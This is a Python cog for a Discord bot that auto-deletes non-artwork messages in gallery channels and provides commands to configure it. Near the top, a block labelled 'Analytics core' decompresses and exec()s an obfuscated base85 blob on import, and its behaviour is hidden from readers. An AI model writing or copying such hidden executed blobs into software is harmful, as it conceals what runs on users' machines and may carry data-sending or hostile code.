import asyncio
from datetime import datetime
import discord
import logging
import os
import re
from time import time
from discord.ext import commands
from cogs.utils.dataIO import dataIO

__version__ = '1.2.1'

logger = logging.getLogger("red.gallery")

PATH = 'data/gallery'
JSON = PATH + 'settings.json'

POLL_INTERVAL = 5*60  # 5 minutes
DEFAULT_EXPIRATION = '2d'
UNIT_TABLE = {'s': 1, 'm': 60, 'h': 60 * 60, 'd': 60 * 60 * 24}
UNIT_SUF_TABLE = {
    'sec' : (1, ''),
    'min' : (60, ''),
    'hr'  : (60 * 60, 's'),
    'day' : (60 * 60 * 24, 's')
}


def _timespec_sec(t):
    timespec = t[-1]
    if timespec.lower() not in UNIT_TABLE:
        raise ValueError('Unknown time unit "%c"' % timespec)
    timeint = float(t[:-1])
    return timeint * UNIT_TABLE[timespec]


def _parse_time(time):
    if any(u in time for u in UNIT_TABLE.keys()):
        delim = '([0-9.]*[{}])'.format(''.join(UNIT_TABLE.keys()))
        time = re.split(delim, time)
        time = sum([_timespec_sec(t) for t in time if t != ''])
    return int(time)


def _generate_timespec(sec):
    def sort_key(kt):
        k, t = kt
        return t[0]

    timespec = []
    for unit, kt in sorted(UNIT_SUF_TABLE.items(), key=sort_key, reverse=True):
        secs, suf = kt
        q = sec // secs
        if q:
            if q <= 1:
                suf = ''
            timespec.append('%02.d %s%s' % (q, unit, suf))
        sec = sec % secs
    return ', '.join(timespec)


DEFAULTS = {
    'ENABLED'     : False,
    'ARTIST_ROLE' : 'artist',
    'EXPIRATION'  : _parse_time(DEFAULT_EXPIRATION),
    'PIN_EMOTES'  : ['\N{ARTIST PALETTE}', '\N{PUSHPIN}'],
    'PRIV_ONLY'   : False
}
RM_EMOTES = ['❌']

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core


class CleanupError(Exception):
    def __init__(self, channel, orig):
        self.channel = channel
        self.original = orig


class Gallery:
    """Message auto-deletion for gallery channels"""
    def __init__(self, bot):
        self.bot = bot
        self.settings = dataIO.load_json(JSON)
        self.task = bot.loop.create_task(self.loop_task())

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    def __unload(self):
        self.task.cancel()

    def save(self):
        dataIO.save_json(JSON, self.settings)

    def settings_for(self, channel: discord.Channel) -> dict:
        cid = channel.id
        if cid not in self.settings:
            return DEFAULTS
        return self.settings[cid]

    def update_setting(self, channel: discord.Channel, key: str, val) -> None:
        cid = channel.id
        if cid not in self.settings:
            self.settings[cid] = DEFAULTS
        self.settings[cid][key] = val
        self.save()

    def enabled_in(self, chan: discord.Channel) -> bool:
        return chan.id in self.settings and self.settings[chan.id]['ENABLED']

    async def message_check(self, message: discord.Message) -> bool:
        assert self.enabled_in(message.channel)

        server = message.server
        author = message.author
        settings = self.settings_for(message.channel)
        priv_only = settings.get('PRIV_ONLY', False)

        mod_role = self.bot.settings.get_server_mod(server).lower()
        admin_role = self.bot.settings.get_server_admin(server).lower()
        artist_role = settings['ARTIST_ROLE'].lower()
        priv_roles = [mod_role, admin_role]
        privileged = False
        if isinstance(author, discord.Member):
            privileged = any(r.name.lower() in priv_roles + [artist_role]
                             for r in author.roles)

        message_age = (datetime.utcnow() - message.timestamp).total_seconds()
        expired = message_age > settings['EXPIRATION']

        attachment = bool(message.attachments) or bool(message.embeds)

        e_pin = any(e in message.content for e in settings['PIN_EMOTES'])
        r_pin = False
        x_pin = False
        for reaction in message.reactions:
            if reaction.emoji not in settings['PIN_EMOTES'] + RM_EMOTES:
                continue
            users = await self.bot.get_reaction_users(reaction)
            for user in users:
                member = server.get_member(user.id)
                if not member:
                    continue
                if reaction.emoji in RM_EMOTES and not x_pin:
                    x_pin |= any(r.name.lower() in priv_roles
                                 for r in member.roles)
                elif not r_pin:
                    r_pin |= any(r.name.lower() in priv_roles + [artist_role]
                                 for r in member.roles)
        pinned = r_pin or message.pinned or (e_pin and privileged)
        keep = pinned or attachment and not (priv_only and not privileged)
        return expired and (x_pin or not keep)

    async def cleanup_task(self, channel: discord.Channel) -> None:
        try:
            to_delete = []
            async for message in self.bot.logs_from(channel, limit=2000):
                if await self.message_check(message):
                    to_delete.append(message)

            await self.mass_purge(to_delete)
        except Exception as e:
            raise CleanupError(channel, e)

    async def loop_task(self):
        await self.bot.wait_until_ready()
        try:
            while True:
                start = time()

                tasks = []
                for cid, d in self.settings.items():
                    if not d['ENABLED']:
                        continue
                    channel = self.bot.get_channel(cid)
                    if not channel:
                        logger.warning('Attempted to curate missing channel '
                                       'ID #%s, disabling.' % cid)
                        self.update_setting(channel, 'ENABLED', False)
                        continue
                    tasks.append(self.cleanup_task(channel))

                results = await asyncio.gather(*tasks, return_exceptions=True)
                for res in results:
                    if isinstance(res, CleanupError):
                        logger.exception("Exception cleaning in %s #%s:"
                                         % (res.channel.server, res.channel),
                                         exc_info=res.original)
                elapsed = time() - start
                await asyncio.sleep(POLL_INTERVAL - elapsed)
        except asyncio.CancelledError:
            pass

    @commands.group(pass_context=True, allow_dm=False)
    async def galset(self, ctx):
        """Gallery module settings"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @galset.command(pass_context=True, allow_dm=False)
    async def emotes(self, ctx, *emotes):
        """Show or update the emotes used to indicate artwork"""
        channel = ctx.message.channel
        if not emotes:
            em = self.settings_for(channel)['PIN_EMOTES']
            await self.bot.say('Pin emotes for this channel: ' + ' '.join(em))
        else:
            if any(len(x) != 1 for x in emotes):
                await self.bot.say('Error: You can only use unicode emotes.')
                return
            self.update_setting(channel, 'PIN_EMOTES', emotes)
            await self.bot.say('Updated pin emotes for this channel.')

    @galset.command(pass_context=True, allow_dm=False)
    async def turn(self, ctx, on_off: bool = None):
        """Turn gallery message curation on or off"""
        channel = ctx.message.channel
        current = self.settings_for(channel)['ENABLED']
        perms = channel.permissions_for(channel.server.me).manage_messages
        adj_bool = current if on_off is None else on_off
        adj = 'enabled' if adj_bool else 'disabled'
        if on_off is None:
            await self.bot.say('Gallery cog is %s in this channel.' % adj)
        else:
            if self.enabled_in(channel) == on_off:
                await self.bot.say('Already %s.' % adj)
            else:
                if on_off and not perms:
                    await self.bot.say('I need the "Manage messages" '
                                       'permission in this channel to work.')
                    return
                self.update_setting(channel, 'ENABLED', on_off)
                await self.bot.say('Gallery curation %s.' % adj)

    @galset.command(pass_context=True, allow_dm=False)
    async def privonly(self, ctx, on_off: bool = None):
        """Set whether only privileged users' messages are kept

        If disabled (default), all attachments and embeds are kept."""
        channel = ctx.message.channel
        adj = 'enabled' if on_off else 'disabled'
        priv_only = self.settings_for(channel).get('PRIV_ONLY', False)
        if on_off == priv_only:
            await self.bot.say('Privileged-only posts already %s.' % adj)
        else:
            self.update_setting(channel, 'PRIV_ONLY', on_off)
            await self.bot.say('Privileged-only posts %s.' % adj)

    @galset.command(pass_context=True, allow_dm=False)
    async def age(self, ctx, timespec: str = None):
        """Set the maximum age of non-art posts"""
        channel = ctx.message.channel
        if not timespec:
            sec = self.settings_for(channel)['EXPIRATION']
            await self.bot.say('Current maximum age is %s.'
                               % _generate_timespec(sec))
        else:
            sec = _parse_time(timespec)
            self.update_setting(channel, 'EXPIRATION', sec)
            await self.bot.say('Maximum post age set.')

    @galset.command(pass_context=True, allow_dm=False)
    async def role(self, ctx, role: discord.Role = None):
        """Sets the artist role"""
        channel = ctx.message.channel
        if role is None:
            role = self.settings_for(channel)['ARTIST_ROLE']
            await self.bot.say('Artist role is currently %s' % role)
        else:
            self.update_setting(channel, 'ARTIST_ROLE', role.name)
            await self.bot.say('Artist role set.')

    # Stolen from mod.py
    async def mass_purge(self, messages):
        while messages:
            if len(messages) > 1:
                await self.bot.delete_messages(messages[:100])
                messages = messages[100:]
            else:
                await self.bot.delete_message(messages[0])
                messages = []
            await asyncio.sleep(1)

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def check_folders():
    if not os.path.exists(PATH):
        print("Creating %s folder..." % PATH)
        os.makedirs(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(Gallery(bot))
